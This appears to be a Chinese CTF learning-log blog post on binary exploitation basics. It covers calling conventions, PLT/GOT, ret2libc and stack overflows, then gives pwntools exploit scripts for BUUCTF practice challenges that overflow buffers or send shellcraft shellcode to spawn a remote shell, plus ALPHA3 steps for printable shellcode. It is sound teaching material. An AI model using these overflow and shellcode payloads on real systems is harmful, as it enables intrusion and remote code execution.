---
title: "CTF 学习日志 0x00 版"
description: "如有错误请指出"
date: 2025-12-17T00:00:00+08:00
image: ctf.png
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---

使用环境 ：wsl kali linux

```
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2025.3"
VERSION="2025.3"
VERSION_CODENAME=kali-rolling
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31
```

## Reference

[hello ctf](https://hello-ctf.com/home/)

[shellcode 的艺术](https://xz.aliyun.com/news/6249)

[生成可打印的shellcode](https://xz.aliyun.com/news/5275)

## 安全保护检查

设某道题附加可执行文件 ciscn 。

`chmod +x ./ciscn` 给文件 ciscn 加上 可执行权限。

`pwn checksec ciscn_2019_c_1` 查这个二进制的常见防护机制。

常见的安全保护：

* Arch: 
  * `i386-32-little`：32 位，小端，参数多在栈上传。
  * `amd64-64-little`：64 位，小端，参数通常走寄存器。
* RELRO：
  * `No RELRO`：GOT 表可写、可在运行时继续解析，更容易做 GOT 覆写。
  * `Partial RELRO`：启用了部分保护：`.got``.plt` 仍可能可写。
  * `Full RELRO`: GOT 在解析完成后会被设成只读，基本堵死 GOT 覆写路线（但不影响 ret2libc/ROP 泄露）
* Stack:
  * `Canary found`：有栈保护，溢出覆盖返回地址前会先覆盖 canary，函数返回时会检查。
  * `No canary found`：没 canary，栈溢出更直接。
* NX：
  * `NX enabled`：栈/堆大多不可执行。
  * `NX disabled`：可执行栈。
* PIE：
  * `PIE enabled`：程序本体代码段地址也会随机化（每次运行基址变）。
  * `No PIE (0x400000)`：程序本体地址固定（常见起点 0x400000），libc 仍可能因 ASLR 随机。

示例（ciscn_2019_c_1）：

<img width="352" height="132" alt="image" src="https://github.com/user-attachments/assets/18e3c6e1-575c-44c8-873d-7c36256a91b6" />


##  初学 Pwn，二进制安全

我们的目的通常是得到 `system` 函数的参数，得到 `system` 我们就可以操控服务器的操作系统。

在 Pwn 题中，我们最想构造的参数永远是 `/bin/sh`。

* 如果执行 `system("ls")`：程序只是列出当前目录的文件，然后马上结束，又回到了受限状态。

* 如果执行 `system("/bin/sh")`：

  * `sh` 是 Linux 的 Shell（壳层） 程序。

  * 当运行它时，它不会自动结束，而是会跳出一个光标，等待你输入新的命令。

  * 这时候，我们获得了一个直接和系统对话的终端窗口。

这就是所谓的 Get Shell（拿设）。

在提供的代码中，往往没有访问根目录的权限，而当我们执行 `system("/bin/sh")` 后，我们就可以在根目录查看 flag。

### x86环境，初识汇编语言 1

以 `C++` 为代表的高级语言，与汇编语言有很大的区别，其中有个区别在于 **如何传递参数** 。

```cpp
#include<stdio.h>

int main(){
    printf("hello world");
    return 0;
}
```

以上述代码（设为 `main.c`）为例，这里的“参数”指的就是字符串 "hello world" 的内存地址。

在 `C` 这类高级语言中，你不需要操心这个字符串放在哪，也不需要操心 printf 怎么拿到它，编译器会帮你搞定一切。

但是从汇编语言的角度来讲，CPU 在执行 `printf` 函数时（即汇编语言中 `call printf` 指令），必须先把参数准备好，放到 **寄存器** 上，`printf` 来了直接从寄存器取。

（寄存器：一个位于 CPU 内的储存结构，里边可以储存一些变量）

#### 寄存器

执行 `gcc -S main.c -o main.s -masm=intel`，我们的 C 语言源码 `main.c` 会被编译，并输出等价的 intel 语法的汇编语言源码在 `main.s` 中

```
.LC0:
    .string "hello world"
main:
    lea rdi, .LC0[rip]
    mov eax, 0
    call    printf@PLT
    mov eax, 0
    ret
```

以上是刚刚代码的汇编代码（摘选），其中：

```
.LC0:
    .string "hello world"
```

指定义数据，`.LC0` 指 `Local Constant 0（局部常量 0 号）`，是 `gcc` 编译器自己起的名字，他在编译器眼里代表了一个内存地址。

那么汇编语言中 `lea rdi, .LC0[rip]`指，把 `.LC0`（也就是 "hello world" 字符串）在内存里的地址，**复制** 到 `rdi` 寄存器里放好。

等到 `call printf`时，它会习惯性地去 `rdi` 里看一眼，就能找到这个字符串在哪里了。

最后 `mov eax, 0` 其实与 `return 0` 相对应，即汇编里的返回值，**接下来我们将分别解析这三部分** 。

* **为什么传递的是“地址”而不是“字符串本身”？**

这就是为什么使用寄存器，寄存器 `rdi` 很小，只有 64 位（8 个字节），放不下很长的字符串。所以我们不把整个“hello world”塞进寄存器，而是把它的地址告诉寄存器。`printf` 拿到地址，就能自己去内存里读出整个字符串了。

* **那么 CPU 中有多少寄存器呢？如果有很多寄存器，如何保证 `printf` 调用 `rdi` 寄存器？**

CPU 中寄存器不止一个，但是他们的分工非常明确。

在 x86 环境下，调用约定（Calling Convention）规定，函数在被调用时，**参数必须按照特定的顺序放在特定的寄存器里**。

`printf` 不会只看 `rdi`，它会根据你给它的参数数量，依次去检查不同的寄存器。

当你在 C 语言里调用一个函数（比如 `printf` 或 `add`）时，前 6 个 **整数型参数** 必须 **依次存放** 在以下寄存器中：

（这里 **整数型参数** 指指针是一个整数，任何类型的指针 `void *, int *, struct node *` 在传参规则里，通通都被视为“整数”。）
（真正不走 `rdi, rsi` 这条路的，主要是 浮点数，它们使用 `XMM` 寄存器，从 `xmm0` 到 `xmm7`）

1. `rdi`，Destination Index（目的）。
2. `rsi`，Source Index （源）。
3. `rdx`，Data（数据）。
4. `rcx`，Counter（计数）。
5. `r8`，第 8 号。
6. `r9`，第 9 号。

容易发现他们的前缀都有一个 r，这其实是 `Register` 的意思，代表了 `64` 位。

同理，e 开头，代表 `Extended` (32位)。

无前缀：代表 16位。

L/H 后缀 (DIL)：代表 `Low` (8位)。这是最小的一个字节。

以 `RDI` 和 `EDI` 为例，它们在物理上是同一个寄存器，该规则适用于所有通用寄存器。

回归正题，如果函数调用，超过 6 个参数，**第 7 个开始的参数才会被放在栈 (Stack)** 上。

举个例子：

假设你在 C 语言里写了这样一行代码，有两个参数：

```
//       参数1    参数2
printf("数字是: %d", 666);
```

汇编的世界里，这一行代码会被拆解成这样：

1. 准备参数 1：把字符串 "数字是: %d" 的地址放入 `rdi`。
2. 准备参数 2：把整数 666 放入 `rsi`。
3. 调用：`call printf`。

printf 先分析 `rdi`寄存器，`rdi = "数字是: %d"` 的地址，然后分析字符串发现 `%d`，于是 **依次** 分析 `rsi`，打印整数 `666`。

另外还有很多很重要的寄存器，我还在学习（）

* 题外话：为社么第 5 个寄存器名为 `r8`？

其实是不太有意义的问题，“8”代表的是它在 CPU 里的编号，而不是它在传递参数时的顺位。

编号为 8 的原因，是因为在 x32 时代，cpu 里只有 8 个寄存器（编号从 0 到 7），当时的工程师还给它们起比较有意义的名字：
```
0,RAX,累加器 (Accumulator)
1,RCX,计数器 (Counter)
2,RDX,数据 (Data)
3,RBX,基址 (Base)
4,RSP,栈顶 (Stack Pointer)
5,RBP,栈底 (Base Pointer)
6,RSI,源索引 (Source Index)
7,RDI,目的索引 (Destination Index)
```

到了 x86-64 时代，决定再加 8 个新的寄存器。新来的自然就从 8 号 开始排，一直排到 15 号。

```
R8, R9, R10, R11, R12, R13, R14, R15
```

#### 调用函数与系统库

容易观察到 `call printf@PLT`，后面有一个 `@PLT`，指 `Procedure Linkage Table（过程链接表）`。

`printf` 并不是我写的函数，而是系统自带的库函数（位于 `libc.so` 这个大仓库里），而系统库 `libc` 的内存地址在每一次运行中位置不同。

这个深刻的机制叫 ASLR(Address Space Layout Randomization，地址空间布局随机化）。

如果没有 ASLR 机制，那么系统库的地址永远固定在一个位置，就容易被黑客写攻击脚本。

为了安全性，ASLR 把水搅浑，每一次新的运行，系统库的内存地址都会改变。

但是，系统库的位置是变化的，`printf` 等函数相对系统库的位置却是固定的，于是我们称这个相对距离叫 **偏移量**。

返回到  `call printf@PLT` 上来，既然 `printf` 的内存地址的变化的，那么我们需要知道 `printf` 具体在哪，这就需要两个工具：

* **`PLT`(过程链接表 - Procedure Linkage Table) 和 `GOT`(全局偏移表 - Global Offset Table)**

`PLT` 执行以下两种操作：

1. 若要访问的地址已经存在于 `GOT` 中：直接访问。

2. 若要访问的地址不存在于 `GOT` 中，那么使用 **“动态链接器 `ld-linux.so`”** 现查这个地址，再把它写入 `GOT` 中。

* 动态链接器Dynamic Linker `ld-linux.so`，它在程序运行前先 **随机** 找到一块内存空地，放入 `libc.so`，记录下 `libc` 的基地址。
* 在 `PLT` 调用其时，再重定位。

`PLT` 与 `GOT` 有点类似于 **接线员和通讯录** 的关系，又有点像 **搜索后的记忆化** 。

而 `GOT` 表 是一块可读写的白板，而且接线员 (`PLT`) 对通讯录 (`GOT`) 是绝对信任的，那么我们可以通过更改 `GOT` 的方法使得程序，执行不该执行的命令。

这带来了著名的 **GOT 覆写攻击** 。

而且得到了 `printf` 的地址，我们就可以通过 **确定** 的偏移量，得到很多东西确定的位置。

这带来了一个经典的攻击技巧：**Ret2Libc（Return to Libc）** 。

##### Ret2Libc

如果我想调用 `system("/bin/sh")`，但不知道 `system` 今天的真实地址在哪里（因为 ASLR），你需要做两步：

1. 泄露 (Leak)：先想办法读取内存，获知现在 `printf` 的真实地址（假设它是 Addr_A）。

2. 计算：
* 我知道 `printf` 和 `system` 在 libc 文件里的相对距离（偏移量差）。
* 比如：`system` 永远在 `printf` 后面 `0x1000` 字节处。（仅为假设）
* 计算出 `system` 的地址 = `Addr_A + 0x1000`。

现在你算出 `system` 的地址了，就可以控制程序跳转过去了。

##### GOT 覆写攻击

攻击者的操作：

1. 利用漏洞（比如任意地址写），偷偷把 `GOT` 表上记录的 `printf` 的真实地址，擦掉。
2. 在上面写上 `system` 函数的地址。
3. 等到程序下次执行 `call printf@PLT` 时...
4. PLT 调用错误的地址，执行错误命令。
5. 结果：本该打印东西，结果却执行了命令（Get Shell）。

#### 汇编里的返回值

观察：

```
mov eax, 0
call    printf@PLT
mov eax, 0
ret
```

`eax` 这个寄存器十分的特殊，它是 **返回值寄存器** 。

当我们调用某个函数，必须把其 **运算结果** 或 **任务状态** 放入 `eax` 寄存器，例如：

* 如果是 `add(2, 3)`：`add` 函数算完后，会把 5 放入 `eax`，然后才返回。
* 如果是 `main` 函数：最后 return 0，就是把 0 放入 `eax`，告诉系统“我正常运行结束了”。

那么汇编中，为什么有两句 `mov eax, 0` 呢？

首先必须了解，**`mov 接收者(Dest)，发送者(Source)` 的结构**，那么

对于第二处：

```
mov eax, 0
ret
```

毫无疑问，`return 0` 为了保证函数结束时，`eax` 里的值确确实实是 0，所以在执行 ret 之前，必须强制把 0 塞进 `eax`。

对于第一处：

```
mov eax, 0
call    printf@PLT
```

因为 `printf` 是一个变参函数（参数个数不确定）。

系统规定：在调用变参函数时，必须用 eax (具体说是 al) 告诉函数，有几个参数是浮点数（放在向量寄存器里的）。

拿这个程序举例子：

1. 我们调用 `printf("hello world")`。
2. 这句话里没有浮点数（小数）。
3. 所以，我们必须把 `eax` 设置为 0。
4. 如果我们不把 `eax` 清零，而 `eax` 里正好残留了一个垃圾数据（比如 5），printf 就会误以为有 5 个浮点数，跑去读取浮点寄存器，这有可能会导致程序崩溃。

### x86环境，初识汇编语言 2

```
#include<stdio.h>

int add(int a, int b){
    return a + b;
} 

int main(){
    printf("%d", add(2, 3));
    return 0;
}
```

对上面的程序进行汇编：

```
add:
        push    rbp
    mov rbp, rsp
    mov DWORD PTR -4[rbp], edi
    mov DWORD PTR -8[rbp], esi
    mov edx, DWORD PTR -4[rbp]
    mov eax, DWORD PTR -8[rbp]
    add eax, edx
    pop rbp
    ret
main:
    push    rbp
    mov rbp, rsp
    mov esi, 3
    mov edi, 2
    call    add
    mov esi, eax
    lea rdi, .LC0[rip]
    mov eax, 0
    call    printf@PLT
    mov eax, 0
    pop rbp
    ret
```

我们主要看函数调用部分：

```
add:
        push    rbp
    mov rbp, rsp
    mov DWORD PTR -4[rbp], edi
    mov DWORD PTR -8[rbp], esi
    mov edx, DWORD PTR -4[rbp]
    mov eax, DWORD PTR -8[rbp]
    add eax, edx
    pop rbp
    ret
```

#### 存储逻辑，栈

对于每一个函数调用过程，都会有一个属于其的栈空间。

对于每一个程序，其启动的时候，内核会为其分配一段 **内存，称为栈**，遵循先进后出。
（内存里**只有一个大栈**，所有函数共用，但是 `rbp` 等 **寄存器只有一个**）

**首先**，在 `main` 函数调用 `call    add` 时，CPU **自动把 “返回地址” 压入栈**。

接下来进入 `add` 函数：

```
RSP,栈顶 (Stack Pointer)
RBP,栈底 (Base Pointer)
```

`push rbp`：保存上一级函数（此例中为 `main`）的基址指针。

在新的栈上进行操作，不能把上一级函数的调用位置忘了，所以先把他压到栈 **保存起来**，接下来我们好对 `rbq` 这个寄存器修改，类似于 `swap(a,b)` 中的 `temp` 变量。

`mov rbp, rsp`：把当前的栈顶变成为新的栈底。

现在，由于 `rbp` 指向的位置已经被**保存在栈了**，所以我们将现在的 `rbp` 寄存器作为新的栈底，建该层函数新的内容，那这层函数刚刚开始，栈顶 `rsp` 就是这侧函数的 `rbp`。

**（`rsp` 寄存器储存的总是当前栈顶的位置。）**

往下看直到 `pop rbq` 的意义其实不大，可以跳过：

`edi` 是刚刚学的，一个 32位寄存器，对应了代码中的 `int a`。

`DWORD PTR`，Double Word Pointer，意思是“操作 4 个字节”（因为 `int` 是 4 字节），**它的针对对象是 `-4[rbp]` **。

（`QWORD PTR` 代表 8 字节或 **指针**，`WORD PTR` 代表 2 字节，`BYTE PTR`代表 1 字节)

`-4[rbp]`：意思是在栈底往上挪 4 个字节的位置。

那么这段代码含义就是：把参数 a 从寄存器里拿出来，备份到栈内存里。

那么我们第一个汇编代码为什么没有 `DWORD PTR`？

因为这个指的是 **在内存里操作 4 字节**，也就是只有真正对内存操作时，才需要引用，而 **栈属于内存**。

如果对第一个代码更改如下：

```
int main() {
    int secret = 1234;  // 定义了一个局部变量
    printf("hello world");
    return 0;
}
```

就会生成以下的汇编：

```
mov DWORD PTR -4[rbp], 1234  ; 
```

那么现在又有一个问题，我在汇编 1 中写道：

> 如果函数调用，超过 6 个参数，**第 7 个开始的参数才会被放在栈 (Stack)** 上。

那么为什么这段汇编代码上来就把两个参数传到了栈里？

因为这是 **函数的临时变量是储存于栈上的**，它是储存问题，不是传参问题。

看 **汇编 2** 的汇编代码：

```
    mov esi, 3
    mov edi, 2
    call    add
```

它的传参依然是传的寄存器，没有动栈。

**最后**，

函数做完了，执行

```
pop rbp
ret
```

* `pop rbp`:
  * 把栈顶的值弹出， 还给 `rbp` 寄存器，这样我们返回上一级函数时，栈帧是正常的。
* `ret`
  * 还记得 `call    add`自动把返回地址入栈吗，当 `rbp` 已经弹出，这个返回地址就露出了。
  * `ret` 会从栈顶弹出一个地址（返回地址），并跳过去执行。

#### 栈溢出 Ret2text

栈溢出的本质，其实是一场**“方向的碰撞”**。

我们得知：

* 栈的生长方向：从高地址 -> 低地址。
  * `push` 会让 `RSP` 减小，新开辟的局部变量（buffer）在低地址。
* 数据的写入方向：从低地址 -> 高地址。
  * 不管是在 C 语言里写数组 `buffer[0], buffer[1]...`，还是用 `read、gets、strcpy` 函数，写入数据时永远是往高地址增长的。

结果： 如果你往 buffer 里写的数据太多，它就会向高地址增长，冲掉栈的内容。

假设 `vulnerable_function` 里有一个 `char buffer[16]`，并且有一个 `read(0, buffer, 100)` 的漏洞（最大读入 100 个字符），或者 `gets(buffer)` 的漏洞（不检查输入长度）。

| 内存地址 (高 -> 低) | 内存里存的东西 | 它是谁？ |
| :--- | :--- | :--- |
| **0x1010** | `0x00401234` | **返回地址 (Ret Addr)** <br> *(指向 Main 的下一行)* |
| **0x1008** | `0x00001000` | **旧 rbp** <br> *(main 的栈底)* |
| **0x1000** | (空) `buffer[8-15]` | 局部变量的高位 |
| **0x0FF8** | (空) `buffer[0-7]` | **局部变量的起始位置** <br> *(read 从这里开始写)* |

(注：这里 buffer 是 16 字节，所以占了两个格子)

现在，我们利用漏洞，强行输入 24 个 'A'，再加上 8 个 'B'。

1. 填满 Buffer (16字节) 输入的前 16 个 'A'，老老实实地填满了 `0x0FFF` 到 `0x1007` 的空间。此时一切正常。
2. 淹没 rbp (8字节) 我们没有停手，继续输入：接下来的 8 个 'A' 没地方去了，只能顺着地址往高处写，它们无情地覆盖了 0x1008 处的 旧 rbp。
* 程序虽然还没崩，但当它想恢复 main 函数的栈底时，会拿到一堆 'A' (0x41414141...)，导致 main 函数的栈废了。
3. 劫持 Ret，我们还在输入：最后的 8 个 'B' 继续往高处写，覆盖了 `0x1010` 处的 返回地址。
* 原本这里写着“回 Main 函数的路”，现在被改成了 'BBBBBBBB' (0x42424242...)。

当 `vulnerable_function` 运行结束，执行到 `ret` 指令时，程序跳转到了一个非法地址，崩溃了（Segmentation Fault）。

那么，我们如果把最后 8 个 `B`，换成 **后门函数（backdoor）** 的真实地址，CPU 就会跳进去帮我们找到 Shell。

#### pwndbg 调试找到 offset

用 pwndbg 找到「覆盖到返回地址 RIP/EIP 需要的字节数（offset）」

自己算也可以。

1. 启动 pwndbg

<img width="679" height="127" alt="image" src="https://github.com/user-attachments/assets/4efc4b9e-4efa-4ee2-939b-49861699ba45" />

2. 查看 main 函数汇编

<img width="529" height="298" alt="image" src="https://github.com/user-attachments/assets/fc7180fc-3b56-4eb1-81e5-581efdfd46ed" />

3. 在 gets 调用处下断点

<img width="173" height="32" alt="image" src="https://github.com/user-attachments/assets/b59f7fe3-847c-4238-8fbf-84ba6698919e" />

4. 运行到断点

<img width="675" height="657" alt="image" src="https://github.com/user-attachments/assets/c520d302-ac1c-4501-a4ff-2d2555e22731" />

5. 生成随机 cyclic 字符串

<img width="1258" height="50" alt="image" src="https://github.com/user-attachments/assets/7f73a3c0-feed-463c-b33f-be35f6dc5d10" />

6. 继续运行程序。

以该题目为例，它会执行 `call gets@plt`，然后卡在 `gets` 里等待你输入。

<img width="1259" height="628" alt="image" src="https://github.com/user-attachments/assets/1150295f-0a2a-4ce1-b889-bf2e9b3966b2" />

其中有一段标为绿色的代码行：

```
► 0x401185 <main+67>    ret                                <0x6161616161616461>
```

箭头 ► 指向指当前要执行的命令是 `ret`，`0x401185 <main+67>` 是 `ret` 的位置，尖括号是 `ret` 将要跳去的地址：`<0x6161616161616461>`。

7. 看当前指令指针指向哪。

<img width="379" height="32" alt="image" src="https://github.com/user-attachments/assets/fcbc93e0-b4cb-49fb-8ad0-2950a2f9002b" />

`0x401185 <main+67>` 即 `ret` 的位置。

8. 查看栈顶的 8 字节内容

<img width="244" height="32" alt="image" src="https://github.com/user-attachments/assets/eb77856d-e56b-44df-9dde-ea91cd0b5877" />

这条命令的含义：“从 $rsp 指向的内存地址开始，读取 8 字节，并用十六进制打印出来。”

9. 反查这 8 字节模式在 cyclic 里的位置，输出就是 offset。 

<img width="507" height="72" alt="image" src="https://github.com/user-attachments/assets/7376ffdc-142f-4367-8e48-44d2284c71b9" />

##### 例题 1：rip

[BUUCTF 题目链接](https://buuoj.cn/challenges#rip)

安全防护检查：

<img width="381" height="169" alt="image" src="https://github.com/user-attachments/assets/c449ecd2-e712-4c1b-ae13-68d0ac36dd79" />

`PIE:        No PIE (0x400000)` 主函数基地址不变，可以直接查函数的地址。

使用 IDA 反编译结果如下：

<img width="1280" height="362" alt="image" src="https://github.com/user-attachments/assets/957b60b5-0338-4b10-af8d-b61cff06d64b" />

容易发现有一个 `fun()` 函数，藏了 `return system("/bin/sh");`。

Exports 中查到 `fun()` 函数的地址：

<img width="1278" height="379" alt="image" src="https://github.com/user-attachments/assets/6cf82a27-b178-46f0-bc65-8383358cb47e" />

是 `fun	0000000000401186	`。

接下来找到 offset，构造 payload，本人使用 gdb 调试得到 offset=23。

然后写代码：

```
# written by Sonnety
from pwn import *

context(os="linux", arch="amd64")
context.log_level = "debug"

host = "node5.buuoj.cn"
port = 25390

offset = 23
fun_addr = 0x401186  # 从 IDA / disas 看到的 fun() 地址
ret_addr = 0x401016

def main():
    io = remote(host, port)

    # 先输出提示再读入
    try:
        io.recvuntil(b"please input", timeout=2)
    except Exception:
        pass
    payload = b"A"*offset + p64(ret_addr) + p64(fun_addr)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

##### 例题 2：warmup_csaw_2016 1

[BUU CTF 题目链接](https://buuoj.cn/challenges#warmup_csaw_2016)

运行可执行文件，得到一些神秘的东西：

```
┌──(Sonnety㉿LAPTOP-R4AP2N3H)-[/mnt/d/CTF_samples/warmup-csaw-2016]
└─$ ./warmup_csaw_2016
-Warm Up-
WOW:0x40060d
```

IDA 反编译一下，发现这是后门函数地址。

<img width="1024" height="181" alt="image" src="https://github.com/user-attachments/assets/b0e020a7-07c6-446b-b01f-bf10b0d0645d" />

<img width="1278" height="392" alt="image" src="https://github.com/user-attachments/assets/37810f8f-5c9a-484f-9145-6e275e253fa3" />

而且还有 gets，只剩下算偏移了。

这个题做了去符号，`disas main`找不到地址，所以执行 `starti`，在 `gets` 上打断点。

<img width="558" height="715" alt="image" src="https://github.com/user-attachments/assets/86f56263-8820-4842-aa12-8a858eeb8375" />

<img width="1157" height="676" alt="image" src="https://github.com/user-attachments/assets/8fd17e8e-7d7a-4a14-8c6f-eca6a08fa595" />

<img width="982" height="238" alt="image" src="https://github.com/user-attachments/assets/0d5108f1-80d4-4928-a0ae-cba227da7c71" />

```
# written by Sonnety
from pwn import *

host = "node5.buuoj.cn"
port = 28105

offset = 72
backdoor = 0x40060d

def main():
	io = remote(host,port)
	
	try:
		io.recvuntil(b"WOW:0x40060d",timeout=2)
	except Exception:
		pass
	payload=b"A"*offset+p64(backdoor)
	io.sendline(payload)
	io.interactive()
if __name__ == "__main__":
	main()

```

##### 例题 3：jarvisoj_level0_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level0)

和上两道题没什么太大区别。

可能多了一个 `rop --grep "ret"` 得到 ret 地址。

不再详细写解题步骤。

```
# written by Sonnety
from pwn import *

host = "node5.buuoj.cn"
port = 28777

offset = 136
backdoor = 0x400596
ret_addr = 0x400431

def main():
	io=remote(host,port)
	try:
		io.recvuntil(b"Hello World",timeout=2)
	except Exception:
		pass
	payload=b"A"*offset+p64(ret_addr)+p64(backdoor)
	io.sendline(payload)
	io.interactive()
if __name__ == "__main__":
	main()

```

#### Ret2shellcode

shellcode 是一段“机器码字节序列”（比如 x86-64 指令），它自己就能完成系统调用：`execve("/bin/sh",0,0)`，从而起 shell。

简单说，`shellcode = asm(shellcraft.sh())` 的含义就是，生成一段打开 `/bin/sh` 的机器码。

先判断“这题能不能 ret2shellcode”，通常安全保护如下：

* NX unknown/disabled、
* No Canary Found

和 Ret2text 差别不大，依然是 dbg 得到 offset，我们使用 `shellcode.ljust(offset, b"\x90")` 将 shellcode 填充到长度为 offset，`\x90` 是 x86 的 NOP 指令（什么都不做）.

那么这一段的含义就是，让 payload 的前 offset 字节 = `“shellcode + 一堆 NOP”`，刚好填到返回地址的位置。

读取 payload 的那个 buf 地址，填入后面返回地址，就会执行 shellcode。

`payload = shellcode.ljust(offset, b"\x00") + p32(buf_addr)`。

##### 例题 1：wdb_2018_3rd_soEasy

[BUU CTF 题目链接](https://buuoj.cn/challenges#wdb_2018_3rd_soEasy)

安全防护如下，注意 **arch: i386-32-little！**

<img width="467" height="177" alt="image" src="https://github.com/user-attachments/assets/dc2ea93c-282d-4cbe-a8bf-42de21b80086" />

在 cyclic 获取 offset 时：

<img width="1217" height="363" alt="image" src="https://github.com/user-attachments/assets/c79d005d-ed62-4f83-9e99-de6366c12330" />

注意：Invalid address 0x61616174，**代表 CPU 的执行流已经跳到一个无效地址（也就是 ret 已经生效，EIP 指向垃圾地址）。**

<img width="305" height="66" alt="image" src="https://github.com/user-attachments/assets/75245759-08c6-413a-9e9d-6b81154f01f7" />

所以我们不应该像之前的题目一样执行 `x/wx $esp`，而应该执行 `x/wx $eip`。

```
# written by Sonnety
from pwn import *

context.arch="i386"
host = "node5.buuoj.cn"
port = 27629
offset = 76

def main():
    io = remote(host,port)
    io.recvuntil(b"Hei,give you a gift->")
    buf_addr = int(io.recvline().strip(),16)
    shellcode = asm(shellcraft.sh())
    payload=shellcode.ljust(offset,b"\x90")+p32(buf_addr)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

##### 例题 2：ciscn_2019_n_5

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_n_5)

这道题虽然网络上很多题解都是 ret2shellcode 做的，但是至少在 BUUOJ 上，我试了三个 ret2shellcode 的题解都死了。

正解是 ret2libc，但是在这里只说 ret2shellcode 的错解（误）

安全检查：

<img width="445" height="197" alt="image" src="https://github.com/user-attachments/assets/7c5749e3-9391-41ec-8225-50772ca0ddd7" />

这道题反编译如下：

<img width="1018" height="338" alt="image" src="https://github.com/user-attachments/assets/ef3e1051-a2e1-4453-9fa7-8d5c037b9467" />

很容易想到 ret2shellcode，先把 shellcode 填入 name，然后利用 gets 栈溢出，使 name 的地址覆盖 ret。

（当然也可以让 shellcode 填入 text，但是 text 在栈上，地址会因为 ASLR 随机化）

<img width="1014" height="317" alt="image" src="https://github.com/user-attachments/assets/f5315268-2fc2-4269-9d2b-37e4a16cbf53" />

```
# written by Sonnety
from pwn import *

context.arch="amd64"
host = "node5.buuoj.cn"
port = 25334
name_addr=0x601080
shellcode=asm(shellcraft.sh())
offset = 0x20+8

def main():
    io=remote(host,port)
    io.recvline()
    io.sendline(shellcode)
    io.recvline()
    io.recvline()
    payload=b"A"*offset+p64(name_addr)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

但是上面的代码会炸，为什么不能 ret2shellcode 呢？

<img width="1208" height="497" alt="image" src="https://github.com/user-attachments/assets/71c291c8-56d8-46ae-b008-bcdd33f67a4a" />

执行 `readelf -W -l ciscn_2019_n_5`，发现 name 的地址 `0x601080` 落在 `0x0000000000600e28` 和 `0x0000000000600e28+0x0001d0` 之间，其权限是 RW ，没有 E，指该段不能执行。

同理，`GNU_STACK` 的权限是 RWE，代表从栈上 ret2shellcode 从权限意义上是可行的。

但是栈的地址是 ASLR 随机化的，所以找栈的位置为什么不直接 ret2libc 呢。

不过大概可以在本地关掉 ASLR 实验一下。

##### 例题 3：mrctf2020_shellcode

[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode)

安全检查：

<img width="392" height="148" alt="52532d2aafc7eb5c50944082a73d0c53" src="https://github.com/user-attachments/assets/dc3413b1-7347-4182-926b-93ddd25f2352" />

<img width="691" height="455" alt="8fd3760501dba3550fb0e8e646f9a1b9" src="https://github.com/user-attachments/assets/cf9e0d1e-9b9f-48c2-b4ef-897c549441a8" />

这道题反编译看不了伪代码，看汇编吧。

<img width="928" height="490" alt="image" src="https://github.com/user-attachments/assets/223f67f9-7ee2-41d5-8d1d-5321a75de850" />

发现这道题直接 jump 到输入的地址上，所以根本不用算溢出（其实也溢出不能，因为 read 规定的读入量爆不了栈），直接把 shellcode 发过去就行。

```
# Written by Sonnety
from pwn import *

context.arch = "amd64"
host = "node5.buuoj.cn"
port = 25867
shellcode = asm(shellcraft.sh())


def main():
    io = remote(host,port)
    io.recvuntil(b"Show me your magic!\n")
    io.sendline(shellcode)
    io.interactive()

if __name__ == "__main__":
    main()

```

[几乎一模一样的题：picoctf_2018_shellcode](https://buuoj.cn/challenges#picoctf_2018_shellcode)

```
# written by Sonnety
from pwn import *
context.arch = "i386"

host = "node5.buuoj.cn"
port = 29289
shellcode = asm(shellcraft.sh())

def main():
    io = remote(host,port)
    io.recvuntil(b"Enter a string!\n")
    io.sendline(shellcode)
    io.recvline()
    io.recvuntil(b"Thanks! Executing now...\n")
    io.interactive()

if __name__ == "__main__":
    main()
```

##### 例题 4：mrctf2020_shellcode_revenge

[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode_revenge)

安全检查：

<img width="445" height="150" alt="image" src="https://github.com/user-attachments/assets/0f5573e2-2b46-4eef-a00e-e73fc9407373" />

反编译依然不能看伪代码，但是看汇编中有明显的 payload 检查，要求 payload 是可见字符。

<img width="1280" height="534" alt="image" src="https://github.com/user-attachments/assets/a5829d54-cb3d-4994-8ef8-a551a8705fc3" />

最后跳到 payload 上，那么我们的 payload 就要求必须是题目指定白名单内的可见 shellcode。

生成指定白名单的可见 shellcode，可以用使用 `ALPHA3` 生成要求的 shellcode。

[ALPHA3](https://github.com/SkyLined/alpha3/tree/master)

先把 shellcode 打印出来放一个文件里，这里的 shellcode 是机器码。

```
# written by Sonnety
from pwn import *
context(arch = "amd64",os = "linux")

f = open("shellcode_x64","wb")
shellcode = asm(shellcraft.sh())

def main():
    f.write(shellcode)
    f.close()

if __name__ == "__main__":
    main()

```

现在我们已经打印到 `shellcode_x64` 文件上了，然后使用 ALPHA3 转成可见 ascii。

以下面的常见命令为例：

`python2 ALPHA3.py <arch> <charset_family> <charset_variant> <reg> --input=<raw_shellcode_file> > out.txt`


* `<arch>`：x86 或者 x64。
* `<charset_family>`：常见是 ascii（可见字符）。
* `<charset_variant>`：mixedcase（大小写混合），uppercase（全大写）
* `<reg>`：告诉 decoder 哪个寄存器指向你的 payload 起始地址
  * 如果题目是 `call rax` / `jmp rax`，通常选 rax
  * 如果题目是 `jmp rsp`，通常选 rsp
* `--input=<file>`：原始 shellcode 的二进制文件（raw bytes）
* 输出 `out.txt`

对于这道题，IDA 的最后有 call rax。

<img width="374" height="140" alt="image" src="https://github.com/user-attachments/assets/d39ea82b-504f-44b1-b489-0241e397ce30" />

所以执行 `python2 ALPHA3.py x64 ascii mixedcase rax --input='shellcode_x64' > x64_out`，然后把 `x64_out` 的东西直接抄到 shellcode 即可。

```
# written by Sonnety
from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")

host = "node5.buuoj.cn"
port = 26289
